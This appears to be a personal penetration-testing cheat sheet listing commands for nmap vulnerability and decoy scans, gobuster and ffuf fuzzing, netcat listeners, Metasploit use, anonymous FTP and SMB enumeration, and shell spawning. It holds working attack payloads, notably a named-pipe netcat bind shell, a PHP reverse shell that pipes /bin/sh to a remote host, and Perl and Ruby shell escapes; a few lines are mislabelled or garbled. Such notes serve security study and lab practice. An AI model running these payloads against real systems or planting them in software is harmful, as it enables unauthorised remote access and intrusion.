# Useful Codes
---
## nMap
---
- Vulnerability Script Nmap SE
```bash
sudo nmap $IP -sV --script vuln
```
- Decoy IP Nmap
```bash
sudo nmap $IP -sS -Pn -n -D RND:5
```
- Update Script DB
```bash
sudo nmap --script-updatedb
```
- Find Scripts for nMap
```bash
find / -type f -name $INPUT* 2>/dev/null | grep scripts
```
- FTP Scan with Scripts
```bash
sudo nmap -sV -p21 -sC -A 10.129.14.136
```
- SMB Scan with Scripts
```bash
sudo nmap $IP -sV -sC -p139,445
```
---
## Gobuster
---
- Gobuster Dir

```bash
gobuster dir -u http://$IP --wordlist $Wordlist
```
---
## Hydra
---



---
## Netcat
---
- Listening for incoming RevShells
```bash
nc -lvnp <port>
```
- Listen for incoming calls
```bash
nc -nc <IP> <port>
```
- Connect to a target
```bash
nc -nv <IP> <port>
```
- Binding a Bash shell to the TCP session
```bash
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l <IP> <port> > /tmp/f
```


---
## Python
---
- Python Server
```python
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

---
## Revshells
---
- PHP Reverse Shell
```php
<?php system ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $IP $PORT >/tmp/f"); ?>
```

---
## XML Prettyfy
---
```bash
xsltproc all.xml -o all.html (nmap xml to html)
```
---
## SSL Certificate
- Check Certificate Term Json
```bash
curl -s https://crt.sh/\?q\=$Domain\&output\=json | jq .
```
- Check Certificate Unique Subdomain
```bash
curl -s https://crt.sh/\?q\=$Domain\&output\=json | jq . | grep name | cut -d":" -f2 | grep -v "CN=" | cut -d'"' -f2 | awk '{gsub(/\\n/,"\n");}1;' | sort -u
```
---
## Metasploit
- Run Metasploit CLI
```bash
msfconsole
```
- Search exploit
```bash
search <exploit>
```
- Show Exploit options
```bash
show options
```
or
```bash
options
```
- Set parameter for exploit
```bash
set <option> <Value>
```
- Run exploit
```bash
run
```
- Show Payloads
```bash
show payloads
```
- Set Payloads
```bash
set payload <no.>
```
- Show Target of exploit
```bash
show targets
```
- Set Targets
```bash
set target <index no.>
```
- [Meterpreter Commands](/Useful_Pages/Meterpreter_Commands.md)

- Show Sessions
```bash
sessions
```
- Interact with a Session
```bash
sessions -i [no.]
```

---
## FTP
- Download All Available Files
```bash
wget -m --no-passive ftp://anonymous:anonymous@$IP

```
- Recursive Listing
```bash
ls -R
```
---
## SMB (Samba)

- Get Smb config
```bash
cat /etc/samba/smb.conf | grep -v "#\|\;" 
```

- List Server's Shares with Null Session (-N) that is an anonymous access.
```bash
smbclient -N -L //$IP
```
## Network File System (NFS)
- Enumerate
```bash
sudo nmap 10.129.9.119 -p111,2049 -sV -sC
```
---

## Ffuf
```bash
ffuf -w ./vhosts -u http://192.168.10.10 -H "HOST: FUZZ.randomtarget.com" -fs 612
```

---

## Hash

- [Understanding Hashes](/Useful_Pages/Hash.md)


---

# Perl

- Perl To Shell
```bash
perl —e 'exec "/bin/sh";'
```
```bash
perl: exec "/bin/sh";
```

---

# Ruby

- Ruby To Shell
```bash
ruby: exec "/bin/sh"
```

---

# Xfreerdp

- Connect to host
```bash
xfreerdp /v:<ip> /u:<username> /p:<password>
```


## Various
- Lista Folder
```bash
tree $PATH
```
- [Unzipping W/ Py and Perl](/Useful_Pages/Unzipping_with_Python_and_Perl.md)

- Check shell type
```bash
env
```
or
```bash
ps
```

- [Prominent Windows Exploits](/Useful_Pages/Prominent_windows_exploits.md)
- [Terminal Setup](/Useful_Pages/Terminalsetup.md)
- [Explanation Bin Rev Shells](/Useful_Pages/Bind_and_Reverse_Shells.md)
- [Tipi di Shell](/Useful_Pages/Shells.md)
- [Cmd vs Powershell](/Useful_Pages/CMD_Vs_PS.md)




